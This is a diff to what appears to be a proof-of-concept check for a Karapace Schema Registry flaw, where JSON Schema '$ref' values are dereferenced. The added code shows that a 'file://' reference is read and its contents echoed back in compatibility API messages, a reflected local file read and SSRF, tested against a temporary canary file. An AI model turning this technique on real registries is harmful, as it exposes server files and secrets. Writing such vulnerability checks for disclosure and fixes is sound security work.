@@ -128,6 +128,35 @@ def demo_ssrf() -> bool:
         server.shutdown()
 
 
+def demo_exfiltration_via_compat_response(tmp_secret: str) -> bool:
+    """Show the fetched content is echoed back to the caller through the compatibility
+    response, i.e. this is a *reflected* SSRF / file read, not blind.
+
+    A real request hits POST /compatibility/subjects/{subject}/versions/{version}. The
+    fetched ``$ref`` document is inlined as a subschema; comparing it against a caller-chosen
+    ``enum`` in the existing version makes the compatibility ``messages`` contain the fetched
+    values verbatim (needs networkx + avro to import ``compatibility``; skipped if absent)."""
+    try:
+        from jsonschema import Draft7Validator
+        from karapace.core.compatibility.jsonschema.checks import compatibility
+    except Exception as exc:  # heavier import chain not available in this env
+        print("[exfil]  (skipped — could not import compatibility():", type(exc).__name__, ")")
+        return False
+
+    reader = Draft7Validator({"type": "object", "properties": {"x": {"enum": ["placeholder"]}}})
+    writer = Draft7Validator({"type": "object", "properties": {"x": {"$ref": f"file://{tmp_secret}"}}})
+    try:
+        result = compatibility(reader, writer)
+    except Exception as exc:  # fixed build refuses the ref
+        print("[exfil]  refused by registry:", type(exc).__name__)
+        return False
+    messages = str(getattr(result, "messages", result))
+    leaked = "CANARY_EXFIL" in messages
+    print("[exfil]  compatibility response messages:", messages[:200])
+    print(f"[exfil]  fetched content returned to caller via API response: {leaked}")
+    return leaked
+
+
 def main() -> int:
     print("== Local file read (file://) ==")
     lfr = demo_local_file_read()
@@ -135,9 +164,21 @@ def main() -> int:
     print("== SSRF (http://) ==")
     ssrf = demo_ssrf()
     print()
-    if lfr or ssrf:
+    print("== Reflected exfiltration via the compatibility API response ==")
+    import os
+    import tempfile
+
+    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as fh:
+        fh.write('{"enum":["CANARY_EXFIL_local_secret_value"]}')
+        secret = fh.name
+    try:
+        exfil = demo_exfiltration_via_compat_response(secret)
+    finally:
+        os.unlink(secret)
+    print()
+    if lfr or ssrf or exfil:
         print("RESULT: VULNERABLE — JSON Schema $ref is dereferenced by the Schema Registry")
-        print(f"        (local file read: {lfr}, outbound SSRF: {ssrf}).")
+        print(f"        (local file read: {lfr}, outbound SSRF: {ssrf}, reflected exfiltration: {exfil}).")
         return 1
     print("RESULT: SAFE — $ref is not externally dereferenced.")
     return 0
